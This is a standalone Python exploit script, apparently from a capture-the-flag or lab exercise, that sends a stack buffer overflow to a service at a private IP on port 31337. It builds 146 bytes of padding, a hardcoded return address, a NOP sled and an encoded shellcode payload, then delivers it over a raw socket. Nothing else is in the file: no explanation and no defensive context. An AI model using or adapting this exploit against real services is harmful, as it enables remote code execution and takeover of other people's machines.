#!/usr/bin/python3
import socket
ip = "10.10.116.227"

port = 31337
timeout = 5
prefix = b""
offset = 146
NOP = b"\x90" * 20
returnAdd = b"\xc3\x14\x04\x08"
buf =  b""
buf += b"\xda\xd8\xbe\xa6\x15\x42\x01\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x52\x31\x77\x17\x83\xc7\x04\x03\xd1\x06\xa0"
buf += b"\xf4\xe1\xc1\xa6\xf7\x19\x12\xc7\x7e\xfc\x23\xc7\xe5"
buf += b"\x75\x13\xf7\x6e\xdb\x98\x7c\x22\xcf\x2b\xf0\xeb\xe0"
buf += b"\x9c\xbf\xcd\xcf\x1d\x93\x2e\x4e\x9e\xee\x62\xb0\x9f"
buf += b"\x20\x77\xb1\xd8\x5d\x7a\xe3\xb1\x2a\x29\x13\xb5\x67"
buf += b"\xf2\x98\x85\x66\x72\x7d\x5d\x88\x53\xd0\xd5\xd3\x73"
buf += b"\xd3\x3a\x68\x3a\xcb\x5f\x55\xf4\x60\xab\x21\x07\xa0"
buf += b"\xe5\xca\xa4\x8d\xc9\x38\xb4\xca\xee\xa2\xc3\x22\x0d"
buf += b"\x5e\xd4\xf1\x6f\x84\x51\xe1\xc8\x4f\xc1\xcd\xe9\x9c"
buf += b"\x94\x86\xe6\x69\xd2\xc0\xea\x6c\x37\x7b\x16\xe4\xb6"
buf += b"\xab\x9e\xbe\x9c\x6f\xfa\x65\xbc\x36\xa6\xc8\xc1\x28"
buf += b"\x09\xb4\x67\x23\xa4\xa1\x15\x6e\xa1\x06\x14\x90\x31"
buf += b"\x01\x2f\xe3\x03\x8e\x9b\x6b\x28\x47\x02\x6c\x4f\x72"
buf += b"\xf2\xe2\xae\x7d\x03\x2b\x75\x29\x53\x43\x5c\x52\x38"
buf += b"\x93\x61\x87\xef\xc3\xcd\x78\x50\xb3\xad\x28\x38\xd9"
buf += b"\x21\x16\x58\xe2\xeb\x3f\xf3\x19\x7c\x4a\x0f\x10\x8d"
buf += b"\x22\x0d\x52\x7c\xef\x98\xb4\x14\x1f\xcd\x6f\x81\x86"
buf += b"\x54\xfb\x30\x46\x43\x86\x73\xcc\x60\x77\x3d\x25\x0c"
buf += b"\x6b\xaa\xc5\x5b\xd1\x7d\xd9\x71\x7d\xe1\x48\x1e\x7d"
buf += b"\x6c\x71\x89\x2a\x39\x47\xc0\xbe\xd7\xfe\x7a\xdc\x25"
buf += b"\x66\x44\x64\xf2\x5b\x4b\x65\x77\xe7\x6f\x75\x41\xe8"
buf += b"\x2b\x21\x1d\xbf\xe5\x9f\xdb\x69\x44\x49\xb2\xc6\x0e"
buf += b"\x1d\x43\x25\x91\x5b\x4c\x60\x67\x83\xfd\xdd\x3e\xbc"
buf += b"\x32\x8a\xb6\xc5\x2e\x2a\x38\x1c\xeb\x4a\xdb\xb4\x06"
buf += b"\xe3\x42\x5d\xab\x6e\x75\x88\xe8\x96\xf6\x38\x91\x6c"
buf += b"\xe6\x49\x94\x29\xa0\xa2\xe4\x22\x45\xc4\x5b\x42\x4c"


buffer=b"A" * 146 + returnAdd + NOP + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))



s.send(prefix + buffer + b"\r\n")
resp = s.recv(1024)
print(resp)

s.close()	